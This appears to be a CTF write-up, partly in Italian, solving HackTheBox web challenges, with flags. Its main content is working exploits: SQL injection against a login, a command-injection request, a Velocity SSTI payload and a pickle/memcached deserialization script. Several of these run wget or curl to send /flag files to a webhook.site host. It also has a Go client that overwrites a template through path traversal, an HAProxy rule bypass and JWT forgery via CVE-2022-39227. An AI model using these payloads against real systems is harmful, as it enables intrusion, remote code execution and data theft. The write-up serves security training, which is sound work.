
# KORP Terminal
 
Sql injection su login molto semplice. mariadb + union select per bypassare password.

`HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}`

<details>
  <summary>Main func app.py </summary>
  
```python
from flask import Blueprint, render_template, jsonify, current_app, request
from application.util.database import MysqlInterface

web = Blueprint("web", __name__)

def response(message):
	return jsonify({"message": message})


@web.route("/", methods=["GET", "POST"])
def index():
	if request.method == "GET":
		return render_template("index.html")

	if request.method == "POST":
		username = request.form.get("username")
		password = request.form.get("password")
		
		if not username or not password:
			return response("Missing parameters"), 400

	mysql_interface = MysqlInterface(current_app.config)
	user_valid = mysql_interface.check_user(username, password)

	if not user_valid:
		return response("Invalid user or password"), 401

	with open("/flag.txt", "r") as file:
		flag = file.read()
		return flag
```
</details>

<details>
  <summary>Db Utils - database.py</summary>
  
  

```python
import time, bcrypt, mysql.connector, sys

class MysqlInterface:
	def __init__(self, config):
		self.connection = None
		
		while self.connection is None:
			try:
				self.connection = mysql.connector.connect(
					host=config["MYSQL_HOST"],
					database=config["MYSQL_DATABASE"],
					user=config["MYSQL_USER"],
					password=config["MYSQL_PASSWORD"]
				)
			except mysql.connector.Error:
				time.sleep(5)
	

	def __del__(self):
		self.close()


	def close(self):
		if self.connection is not None:
			self.connection.close()


	def query(self, query, args=(), one=False):
		cursor = self.connection.cursor()
		results = None

		cursor.execute(query, args)
		rv = [dict((cursor.description[idx][0], value)
			for idx, value in enumerate(row)) for row in cursor.fetchall()]
		results = (rv[0] if rv else None) if one else rv
	
		return results

	
	def check_user(self, username, password):
		user = self.query(f"SELECT password FROM users WHERE username = '{username}'", one=True)

		if not user:
			return False

		password_bytes = password.encode("utf-8")
		password_encoded = user["password"].encode("utf-8")
		matched = bcrypt.checkpw(password_bytes, password_encoded)
		
		if matched:
			return True
		
		return False
```
</details>

# TIME Korp


`HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}`

RCE with:

```
GET /?format=%Y-%m-%d'|wget+'https://webhook.site/4620a451-301d-4dc2-8018-7e373d2d04b8'+--post-file+/flag+%23 HTTP/1.1
Host: 83.136.252.82:55456
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

# Labyrinth Linguist 

`HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}`

RCE with SSTI via Velocity templater.

```
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("bash -c {curl,https://webhook.site/4620a451-301d-4dc2-8018-7e373d2d04b8/?p=$(cat${IFS}/flag*.txt|base64)}"))
#set($null=$process.waitFor() )
```

gli spazi dentro i comandi: `$()` danno fastidio a `runtime.Exec`

# Testimonial

controlli fatti sul client grpc. Replicare il client e sfruttare l'unsafe file write usato dal codice in go per sovrascrivere files (codici sorgenti in go). cosi possiamo ottenere RCE.

unsafe write:

```go
	err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
	if err != nil {
		return nil, err
	}
```

<details>
  <summary>Expoit - client.go </summary>

```go
package main

import (
	"context"
	"fmt"
	"htbchal/pb"

	// "strings"
	"sync"

	"google.golang.org/grpc"
)

var (
	grpcClient *Client
	mutex      *sync.Mutex
)

func init() {
	grpcClient = nil
	mutex = &sync.Mutex{}
}

type Client struct {
	pb.RickyServiceClient
}

func GetClient() (*Client, error) {
	mutex.Lock()
	defer mutex.Unlock()

	if grpcClient == nil {
		conn, err := grpc.Dial(fmt.Sprintf("83.136.249.253%s", ":30667"), grpc.WithInsecure())
		if err != nil {
			return nil, err
		}

		grpcClient = &Client{pb.NewRickyServiceClient(conn)}
	}

	return grpcClient, nil
}

func main() {
	c, err := GetClient()

	if err != nil {
		panic(err)
	}

	err = c.SendTestimonial()

	if err != nil {
		fmt.Println("error in sending " + err.Error())
	}

	fmt.Println("Done")
}

func (c *Client) SendTestimonial() error {
	ctx := context.Background()
	// Filter bad characters.

	customer := `../../view/home/index.templ`
	testimonial := `package home

import (
	"htbchal/view/layout"
	"io/fs"	
	"fmt"
	"os"
)
	
templ Index() {
	@layout.App(true) {
<nav class="navbar navbar-expand-lg navbar-dark bg-black">
  <div class="container-fluid">
	<a class="navbar-brand" href="/">The Fray</a>
	<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
			aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
		<span class="navbar-toggler-icon"></span>
	</button>
	<div class="collapse navbar-collapse" id="navbarNav">
		<ul class="navbar-nav ml-auto">
			<li class="nav-item active">
				<a class="nav-link" href="/">Home</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="javascript:void();">Factions</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="javascript:void();">Trials</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="javascript:void();">Contact</a>
			</li>
		</ul>
	</div>
  </div>
</nav>
	
<div class="container">
  <section class="jumbotron text-center">
	  <div class="container mt-5">
		  <h1 class="display-4">Welcome to The Fray</h1>
		  <p class="lead">Assemble your faction and prove you're the last one standing!</p>
		  <a href="javascript:void();" class="btn btn-primary btn-lg">Get Started</a>
	  </div>
  </section>

  <section class="container mt-5">
	  <h2 class="text-center mb-4">What Others Say</h2>
	  <div class="row">
		  @Testimonials()
	  </div>
  </section>


  <div class="row mt-5 mb-5">
	<div class="col-md">
	  <h2 class="text-center mb-4">Submit Your Testimonial</h2>
	  <form method="get" action="/">
		<div class="form-group">
		  <label class="mt-2" for="testimonialText">Your Testimonial</label>
		  <textarea class="form-control mt-2" id="testimonialText" rows="3" name="testimonial"></textarea>
		</div>
		<div class="form-group">
		  <label class="mt-2" for="testifierName">Your Name</label>
		  <input type="text" class="form-control mt-2" id="testifierName" name="customer"/>
		</div>
		<button type="submit" class="btn btn-primary mt-4">Submit Testimonial</button>
	  </form>
	</div>
  </div>
</div>

<footer class="bg-black text-white text-center py-3">
	<p>&copy; 2024 The Fray. All Rights Reserved.</p>
</footer>
	}
}

func GetTestimonials() []string {
	fmt.Println("Hello")
	fsys := os.DirFS("/")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

templ Testimonials() {
  for _, item := range GetTestimonials() {
	<div class="col-md-4">
		<div class="card mb-4">
			<div class="card-body">
				<p class="card-text">"{item}"</p>
				<p class="text-muted">- Anonymous Testifier</p>
			</div>
		</div>
	</div>
  }
}`

	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}

```
</details>

# LockTalk

bypass `http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }`

with:

`.//api/v1/get_ticket`

```
curl http://83.136.254.142:32710/.//api/v1/get_ticket
{"ticket: ":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwNzMwODgsImlhdCI6MTcxMDA2OTQ4OCwianRpIjoiVWw2dnp4eUI1aGZxS1dSaGROVGhqQSIsIm5iZiI6MTcxMDA2OTQ4OCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.XA3WyhUzIPjccQebnkdTUHSYTj5rpkpQX2f_ZVfpZDlm64uHTY8Brf7rGPxFAB-HtOuM1-7RUPUETWEKpYuq_8jDHJeLGnqqoTM-5LGYlsacyQtVaO4eCVjV_0bIx8fSLm7hYa39Vsq5mo4enkGJqnvK15XaKHoUsv8N608mIpUwUaplVxit_zZFauwOj6WiIBQoeMwg_IEMVO8RfsUHvQq8ca4D9vs1DdVnjFncL0WVMtLhcJztiioTK0zHUrj--d10ir_bEm9qzjxztFCJdtYoXaf7zFT5qbffoqhR7nMFAKCTtQZSQPCtCw39P1f9CnTMV1NWKMYyRzBNLOPc9g"}
```

requirements show python_jwt==3.3.3

`CVE-2022-39227`


use github script to injecti new claims as administrator:

```
python3 cve_2022_39227.py -j 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwNzMxODAsImlhdCI6MTcxMDA2OTU4MCwianRpIjoiMXc2cVhLM2ZkbFA0NHlkMENLU2FGZyIsIm5iZiI6MTcxMDA2OTU4MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.ffDygl3yM0Kd4vIMGS_oyq9ezdTNW9KCsu-V_H1WfciM_g97sVKGJOgo0rCMBOKAnE1icekY2vbH70vDs8AkbD6DiwnB5NDLN5YbzL9v5NAhyrEpmgInDxDuFtlWtFQkLj2O0KrSOnUskhTZPfC8k5wCFCKUPecaAUr3hT-OTM6hh5F0k0FqkIH6xFPPFMBHzSDhR23I7jNtPMdNVZlXPM_Go5e6UVv6-gy2cAe6xaziAyJ9pGwCSEvhGnZZQ-SDTTwQUKuPpPxoUv7yyBx8FNSTTCpUcZlnXFiAZ4lEZShWZ5xccubNKGmIeMLAQXqeERve4lmO5T7UtFIXq7x_gw' -i 'role=administrator'
```
copy and paste wath you get after `auth=` ad auth token to obtain the flag

```
Authorization: {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwNzMxODAsImlhdCI6MTcxMDA2OTU4MCwianRpIjoiMXc2cVhLM2ZkbFA0NHlkMENLU2FGZyIsIm5iZiI6MTcxMDA2OTU4MCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAwNzMxODAsImlhdCI6MTcxMDA2OTU4MCwianRpIjoiMXc2cVhLM2ZkbFA0NHlkMENLU2FGZyIsIm5iZiI6MTcxMDA2OTU4MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"ffDygl3yM0Kd4vIMGS_oyq9ezdTNW9KCsu-V_H1WfciM_g97sVKGJOgo0rCMBOKAnE1icekY2vbH70vDs8AkbD6DiwnB5NDLN5YbzL9v5NAhyrEpmgInDxDuFtlWtFQkLj2O0KrSOnUskhTZPfC8k5wCFCKUPecaAUr3hT-OTM6hh5F0k0FqkIH6xFPPFMBHzSDhR23I7jNtPMdNVZlXPM_Go5e6UVv6-gy2cAe6xaziAyJ9pGwCSEvhGnZZQ-SDTTwQUKuPpPxoUv7yyBx8FNSTTCpUcZlnXFiAZ4lEZShWZ5xccubNKGmIeMLAQXqeERve4lmO5T7UtFIXq7x_gw"}
```


# Serial Flow

https://stackoverflow.com/questions/14482228/how-to-properly-prevent-memcached-protocol-injection
https://cyruslab.net/2021/04/08/deserialization-of-flask-app-and-memcached/
https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/
https://github.com/spipm/BraekerCTF_2024_public/blob/main/challenges/webservices/leaderbot-dashboard/solve/sploit.py
https://hackmag.com/security/a-small-injection-for-memcached/

```python
import pickle
import os
import requests as r
class RCE:
    def __reduce__(self):
        cmd = ('wget https://webhook.site/4620a451-301d-4dc2-8018-7e373d2d04b8 --post-file /flag*.txt')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset foo:123 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get foo:123')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""

url = "http://83.136.249.153:48512/set"

response = r.get(url, cookies={"session": generate_exploit()}, params={'uicolor': "test"}, allow_redirects=True)

print(response.headers)
```